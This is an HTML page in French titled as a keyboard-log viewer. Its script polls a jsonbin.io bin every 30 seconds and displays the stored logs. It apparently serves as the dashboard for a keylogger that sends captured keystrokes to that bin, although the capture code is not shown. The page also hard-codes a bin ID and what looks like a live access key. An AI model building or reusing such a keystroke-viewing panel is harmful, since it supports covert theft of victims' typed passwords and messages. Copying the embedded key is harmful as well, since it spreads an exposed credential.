<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Visualiseur de Logs</title>
    <style>
        body { font-family: 'Courier New', Courier, monospace; background-color: #1e1e1e; color: #d4d4d4; margin: 20px; }
        h1 { color: #569cd6; }
        pre { background-color: #252526; padding: 15px; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; }
        .status { color: #4ec9b0; margin-bottom: 20px; }
        .error { color: #f44747; }
    </style>
</head>
<body>

    <h1>Visualiseur de Logs Clavier</h1>
    <p class="status" id="status">Chargement des logs...</p>

    <pre id="log-content"></pre>

    <script>
        // --- Configuration ---
        const BIN_ID = "6936d04a43b1c97be9dfacb1"; // <--- REMPLACEZ CECI PAR L'ID DE VOTRE BIN
        // IMPORTANT: Utilisez ici la clé d'accès en lecture seule (X-Access-Key)
        const API_KEY = "$2a$10$NmWtedhMFgVwPoNcmy7Aae0s0y9Yn.m9vfmLl/J5FK.B52.50V6kG"; // <--- REMPLACEZ CECI PAR VOTRE CLÉ D'ACCÈS EN LECTURE SEULE
        const JSONBIN_URL = `https://api.jsonbin.io/v3/b/${BIN_ID}/latest`;

        const statusElement = document.getElementById('status');
        const logContentElement = document.getElementById('log-content');

        async function fetchLogs() {
            try {
                statusElement.textContent = "Récupération des logs...";
                statusElement.className = "status";

                const response = await fetch(JSONBIN_URL, {
                    headers: {
                        'X-Access-Key': API_KEY // On utilise l'Access Key pour lire
                    }
                });

                if (!response.ok) {
                    throw new Error(`Erreur HTTP: ${response.status} ${response.statusText}`);
                }

                const data = await response.json();
                const logs = data.record.logs;

                if (logs) {
                    logContentElement.textContent = logs;
                    statusElement.textContent = `Logs mis à jour: ${new Date().toLocaleTimeString()}`;
                } else {
                    logContentElement.textContent = "Aucun log trouvé.";
                    statusElement.textContent = "Aucun log à afficher.";
                }

            } catch (error) {
                console.error("Impossible de récupérer les logs:", error);
                statusElement.textContent = `Erreur: ${error.message}. Vérifiez l'ID du bin et la clé API.`;
                statusElement.className = "status error";
                logContentElement.textContent = "Échec du chargement.";
            }
        }

        // Récupérer les logs au chargement de la page
        fetchLogs();

        // Optionnel: Actualiser les logs toutes les 30 secondes
        setInterval(fetchLogs, 30000);

    </script>

</body>
</html>
